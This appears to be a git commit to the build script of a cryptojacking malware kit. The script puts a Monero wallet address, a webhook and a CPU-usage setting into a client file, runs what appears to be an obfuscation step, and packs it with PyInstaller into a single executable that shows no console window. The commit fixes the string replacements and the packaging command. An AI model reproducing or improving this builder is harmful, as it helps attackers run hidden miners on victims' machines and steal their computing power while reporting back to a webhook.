942ada773c7c7c7f7c2ff5f3e80b04487f288f6e
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2022-08-20 06:09:55 +0200

    Update compile.py

--- compile.py
+++ compile.py
@@ -11,7 +11,7 @@ miningpercent = input("CPU Usage (30 is the best) :")
 if trxaddress == "":
 	trxaddress = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq"
 filecontent = open("client.py", "r").read()
-filecontent = filecontent.replace("webhook667", webhook).replace("XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq", + trxaddress ).replace("MINING_PERCENT", str(miningpercent))
+filecontent = filecontent.replace("webhook667", webhook).replace("42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq", trxaddress ).replace("miningpercentEKIP", str(miningpercent))
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
@@ -19,4 +19,4 @@ val = input("Do you use py, python or python3 filename.py to launch file? (py/py
 
 os.system(val + " hash.py")
 
-os.system(val + ' PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
+os.system('pyinstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
